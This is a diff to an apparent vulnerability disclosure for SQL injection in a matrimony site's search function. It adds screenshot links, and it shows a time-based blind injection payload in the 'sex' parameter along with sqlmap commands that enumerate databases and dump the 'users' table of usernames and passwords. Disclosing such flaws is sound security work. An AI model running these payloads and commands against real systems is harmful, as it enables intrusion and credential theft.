@@ -82,17 +82,21 @@ Step 2 – Vulnerable Source Code
 
 The search function directly embeds POST parameters into the SQL query. 
 
+![POC](images/vulnerable%20code.png)
+
 
 The ‘ in parameter leads to MySQL error confirming SQL injection 
 
+![POC](images/sqli%20erro.png)
 
 Step 3 – Manual SQL Injection 
 
 The intercepted POST request was modified by injecting a time-based SQL payload into the  sex parameter. 
 Payload: sex=male'%2b(select*from(select(sleep(20)))a)%2b'&maritalstatus=Single&country=Dubai&district=Calicut&state=Kerala&religion=Christian-All&mothertounge=Tamil&agemin=19&agemax=50&search=Search
 
-The application response was delayed by approximately 20 seconds, confirming successful  time-based blind SQL injection.
+![POC](images/sqli%20manual.png)
 
+The application response was delayed by approximately 20 seconds, confirming successful  time-based blind SQL injection.
 
 
 Step 4 – SQLMap Verification 
@@ -100,6 +104,8 @@ Step 4 – SQLMap Verification
 The captured request was supplied to SQLMap. 
 
 command:  ```python python .\sqlmap.py -r .\code_test_1.txt --batch --dbs ```
+
+![POC](images/sqli%201.png)
  
 SQLMap confirmed that the sex parameter is injectable using: 
 
@@ -110,6 +116,7 @@ SQLMap confirmed that the sex parameter is injectable using:
 
 Database Enumeration 
 
+![POC](images/sqli%202.png)
 Using SQLMap, multiple databases were successfully enumerated. 
 information_schema 
 matrimony
@@ -118,6 +125,9 @@ performance_schema
 phpmyadmin 
 test 
 
+command: ```python python .\sqlmap.py -r .\code_test_1.txt --batch -D matrimony --tables```
+
+![POC](images/sqli%203.png)
 
 Credential Disclosure 
 
@@ -125,7 +135,8 @@ The vulnerable SQL Injection allowed extraction of user records from the applica
 
 command: ```python python .\sqlmap.py -r .\code_test_1.txt --batch -D matrimony -T users --dump ```
 
-
+![POC](images/sqli%204.png)
+![POC](images/sqli%205.png)
 The following sensitive information was retrieved: 
 • Usernames  
 • Passwords  
